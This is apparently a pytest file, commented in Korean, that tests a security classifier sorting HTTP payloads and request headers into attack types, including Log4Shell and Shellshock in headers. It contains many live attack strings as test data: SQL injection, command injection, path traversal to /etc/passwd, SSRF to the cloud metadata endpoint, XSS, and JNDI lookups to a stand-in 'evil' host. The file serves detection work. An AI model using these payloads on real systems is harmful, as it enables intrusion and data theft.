"""공격 유형 분류 단일 홈(core.classify) 테스트.

핵심(SOC 붙여넣기):
    예전 분류기는 payload+URL+body 만 봐서 요청 '헤더'에 실린 공격(Log4Shell·Shellshock·
    헤더 SQLi)이 통째로 미분류됐다. 이제 헤더도 본다 — 단, 정상 헤더에 흔한 토큰
    (localhost·//host.)으로 오탐하지 않게 안전 마커만 헤더를 훑는다.

    또한 세 벌로 흩어졌던 분류기(analyzer.infer_attack_type, ai_analyzer._infer_category)를
    이 한 곳에 위임 — 기존 계약을 그대로 재현하는지 회귀로 지킨다.
"""
import pytest

from core.classify import classify, infer_attack_type
from core import analyzer, ai_analyzer

Q, D = "'", '"'


# ─────────────────────────────────────────────────────────────────────────────
# 기존 infer_attack_type 계약 재현 (analyzer 위임)
# ─────────────────────────────────────────────────────────────────────────────
_MATRIX = {
    "sqli": [f"{Q} OR {Q}1{Q}={Q}1", f"1{Q} UNION SELECT NULL-- -", "1 AND SLEEP(5)-- -",
             f"admin{Q}-- -", f"1{Q}; DROP TABLE users-- -", f"1{Q} ORDER BY 5-- -"],
    "cmdi": [";id", "| id", "$(id)", "`id`", "& whoami", "dest_host=;id;"],
    "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
    "lfi":  ["../../../../etc/passwd", "/proc/self/environ", "..%2f..%2fetc%2fpasswd",
             "....//....//etc/passwd", ";cat /etc/passwd"],
    "ssrf": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80/", "gopher://127.0.0.1"],
    "xss":  ["<script>alert(1)</script>", f'{D}><img src=x onerror=alert(1)>',
             "<svg/onload=alert(1)>", "javascript:alert(1)"],
}


@pytest.mark.parametrize("expected,payload", [(e, p) for e, ps in _MATRIX.items() for p in ps])
def test_matrix_via_classify(expected, payload):
    assert classify(payload=payload).primary == expected


@pytest.mark.parametrize("expected,payload", [(e, p) for e, ps in _MATRIX.items() for p in ps])
def test_matrix_via_analyzer_infer(expected, payload):
    """analyzer.infer_attack_type 도 동일 결과(위임 회귀)."""
    assert analyzer.infer_attack_type(payload, "") == expected


def test_file_access_beats_label():
    assert infer_attack_type("/site/.git/config", "authbypass") == "lfi"
    assert infer_attack_type("/.env", "") == "lfi"


def test_xss_semicolon_not_cmdi():
    for p in ["<script>alert(1);</script>", f"{D}><img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"]:
        assert classify(payload=p).primary == "xss"


def test_empty_falls_back_to_category():
    assert classify(payload="just a normal value", category="sqli").primary == "sqli"
    assert classify(payload="", category="").primary == ""


# ─────────────────────────────────────────────────────────────────────────────
# 헤더에 실린 공격 — SOC 붙여넣기의 핵심
# ─────────────────────────────────────────────────────────────────────────────
def test_log4shell_in_header_classified():
    r = classify(payload="q=1", headers={"user-agent": "${jndi:ldap://evil/x}"})
    assert r.primary == "cmdi"
    assert r.header_borne is True
    assert any(c.subtype == "log4shell" for c in r.candidates)


def test_log4shell_variants():
    for scheme in ("ldap", "ldaps", "rmi", "dns"):
        r = classify(headers={"x-api-version": "${jndi:%s://a/b}" % scheme})
        assert r.primary == "cmdi" and r.header_borne


def test_shellshock_in_header_classified():
    r = classify(payload="q=1", headers={"referer": "() { :;}; /bin/bash -c 'id'"})
    assert r.primary == "cmdi" and r.header_borne


def test_header_sqli_classified():
    r = classify(headers={"x-forwarded-for": "1' UNION SELECT password FROM users-- -"})
    assert r.primary == "sqli" and r.header_borne


def test_traversal_in_header_classified():
    r = classify(headers={"x-original-url": "/../../../../etc/passwd"})
    assert r.primary == "lfi" and r.header_borne


# ─────────────────────────────────────────────────────────────────────────────
# 정상 헤더 오탐 방지 — 안전 마커만 헤더를 훑는다
# ─────────────────────────────────────────────────────────────────────────────
def test_normal_headers_no_false_positive():
    r = classify(payload="q=hello", headers={
        "host": "internal.corp.example",          # SSRF 'internal' — 헤더 스캔 제외라 무시
        "referer": "https://cdn.site.com/page",   # redirect '//host.' — 헤더 스캔 제외
        "user-agent": "Mozilla/5.0 (Windows NT 10.0)",
        "cookie": "session=abc; theme=dark",
    })
    assert r.primary == ""            # 아무 공격도 아님
    assert r.header_borne is False


def test_ssrf_localhost_in_host_header_not_flagged():
    """localhost 가 Host 에 있어도 SSRF 로 오분류하지 않는다(헤더 스캔 제외 대상)."""
    r = classify(payload="page=1", headers={"host": "localhost:8080"})
    assert r.primary == ""


def test_ssrf_in_body_still_classified():
    """반면 본문/URL 의 SSRF 는 그대로 분류된다."""
    assert classify(payload="url=http://169.254.169.254/").primary == "ssrf"


# ─────────────────────────────────────────────────────────────────────────────
# 다중 후보 + 우선순위
# ─────────────────────────────────────────────────────────────────────────────
def test_multi_candidate_reports_all():
    r = classify(payload="<script>alert(1)</script>",
                 headers={"user-agent": "${jndi:ldap://x/a}"})
    types = r.types
    assert "cmdi" in types and "xss" in types
    assert r.primary == "cmdi"        # log4shell 규칙이 앞순위


def test_log4shell_not_double_classified_as_ssti():
    """${jndi:...} 는 ${ 때문에 예전엔 ssti 로 오분류됐다 — 이제 cmdi(log4shell) 단일."""
    r = classify(payload="${jndi:ldap://x/a}")
    assert r.primary == "cmdi"
    assert "ssti" not in r.types


# ─────────────────────────────────────────────────────────────────────────────
# ai_analyzer._infer_category 위임 — 공용 분류는 classify, 고유분(redirect/authbypass) 유지
# ─────────────────────────────────────────────────────────────────────────────
def test_ai_infer_category_shared_families():
    assert ai_analyzer._infer_category("' OR '1'='1") == "sqli"
    assert ai_analyzer._infer_category("<script>alert(1)</script>") == "xss"
    assert ai_analyzer._infer_category("{{7*7}}") == "ssti"
    assert ai_analyzer._infer_category("$ne") == "nosql"


def test_ai_infer_category_keeps_own_extras():
    assert ai_analyzer._infer_category("//evil.com") == "redirect"
    assert ai_analyzer._infer_category("..;/admin") == "authbypass"
    assert ai_analyzer._infer_category("just text") == "other"


def test_ai_infer_category_file_access_priority():
    assert ai_analyzer._infer_category("/app/.git/config") == "lfi"


# ─────────────────────────────────────────────────────────────────────────────
# 대상 URL 의 host 는 분류에서 제외 — 내부 IP 대상이 SSRF 로 오분류되지 않는다
# (SOC 는 흔히 내부 IP/호스트를 대상으로 붙여넣는다)
# ─────────────────────────────────────────────────────────────────────────────
def test_internal_target_host_not_ssrf():
    """대상이 127.0.0.1/localhost/internal 이어도 공격이 아니면 SSRF 로 분류하지 않는다."""
    assert classify(url="http://127.0.0.1:8080/login").primary == ""
    assert classify(url="https://localhost/admin").primary == ""
    assert classify(url="http://internal.corp/api").primary == ""


def test_ssrf_in_query_param_still_classified():
    """반면 SSRF 공격이 '파라미터 값'에 있으면 그대로 분류된다."""
    assert classify(url="http://127.0.0.1/fetch?target=http://169.254.169.254/").primary == "ssrf"
    assert classify(payload="http://169.254.169.254/latest/meta-data/").primary == "ssrf"


def test_header_sqli_not_masked_by_internal_target():
    """내부 대상 host 가 SSRF 를 가리지 않으므로, 헤더 SQLi 가 제대로 분류된다."""
    r = classify(url="http://127.0.0.1:8731/login",
                 headers={"x-forwarded-for": "1' UNION SELECT pw FROM users-- -"})
    assert r.primary == "sqli" and r.header_borne


def test_log4shell_header_with_internal_target():
    r = classify(url="http://10.0.0.5/api", headers={"user-agent": "${jndi:ldap://x/a}"})
    assert r.primary == "cmdi"
